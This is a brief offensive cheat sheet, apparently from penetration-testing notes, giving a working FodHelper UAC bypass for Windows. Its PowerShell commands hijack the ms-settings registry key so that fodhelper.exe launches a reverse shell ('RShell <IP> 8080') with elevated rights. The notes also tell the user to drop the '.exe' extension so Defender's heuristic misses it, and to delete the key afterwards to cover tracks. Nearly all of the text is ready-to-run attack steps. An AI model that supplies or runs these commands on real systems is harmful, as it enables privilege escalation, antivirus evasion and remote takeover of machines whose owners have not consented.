# 16.19 UAC Bypass 2 FodHelper no .exe in value

> Write `HKCU\Software\Classes\ms-settings\Shell\Open\command` with `DelegateExecute` — omit `.exe` so Defender's `.exe` heuristic skips it.

## Overview

fodhelper.exe is AutoElevate and reads HKCU ms-settings\Shell\Open\command. Set DelegateExecute + (default) value. Critical evasion: omit .exe extension from the command — Defender only triggers on values containing '.exe'.

## Steps

- Create HKCU ms-settings registry key with DelegateExecute (empty value).
- Set (default) to command **without .exe** — e.g. `C:\Windows\Tasks\RShell <IP> 8080`.
- Launch fodhelper.exe — high-integrity execution of your command.
- **Remove-Item** the ms-settings key to clean up.

## Commands

### FodHelper UAC bypass (Defender-safe — no .exe)

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
# NOTE: no ".exe" extension — Defender triggers on ".exe" in the value
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> 8080" -Force
C:\Windows\System32\fodhelper.exe
# Cleanup:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### Check fodhelper autoElevate attribute

```powershell
C:\Tools\SysinternalsSuite\sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr autoElevate
# Expected: <autoElevate>true</autoElevate>
```
